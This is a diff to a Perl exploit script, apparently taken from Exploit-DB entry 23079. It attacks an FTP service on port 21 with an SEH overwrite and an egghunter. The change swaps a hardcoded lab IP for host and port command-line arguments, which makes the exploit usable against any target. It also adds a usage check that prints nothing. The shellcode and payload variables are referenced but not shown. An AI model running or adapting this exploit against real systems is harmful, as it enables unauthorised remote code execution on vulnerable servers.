@@ -7,6 +7,7 @@
 # EDB 23079 1330 1339
 # Greetz corelan, TecR0C, mr_me
 
+if (scalar(@ARGV) != 2) { "Usage $0 host port\n"; exit; }
 use IO::Socket::INET;
 # Null byte in ppr forces a backwards short jump allowing 128 bytes shellcode max
 # Thus we use an egghunter
@@ -44,8 +45,8 @@ my $pad = "X" x 209 ."\r\n";
 
 my $payload = $pre . $seh1 . $seh2 . $pad;
 
-my $sock = IO::Socket::INET->new("192.168.58.135:21");
-my $eggsock = IO::Socket::INET->new("192.168.58.135:21");
+my $sock = IO::Socket::INET->new("$ARGV[0]:$ARGV[1]") or die "Unable to connect!\n";
+my $eggsock = IO::Socket::INET->new("$ARGV[0]:$ARGV[1]") or die "Unable to connect!\n";
 print $eggsock $egg;
 sleep 1;
 print $sock $usr;
